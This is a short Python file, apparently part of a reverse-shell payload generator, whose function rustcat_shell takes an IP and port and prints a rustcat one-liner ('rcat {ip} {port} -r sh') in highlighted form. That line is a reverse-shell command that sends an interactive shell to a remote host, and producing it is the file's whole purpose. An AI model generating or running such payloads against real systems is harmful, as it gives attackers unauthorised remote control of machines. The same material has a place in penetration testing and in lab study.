from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def rustcat_shell(ip, port):
    payload = f"rcat {ip} {port} -r sh"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")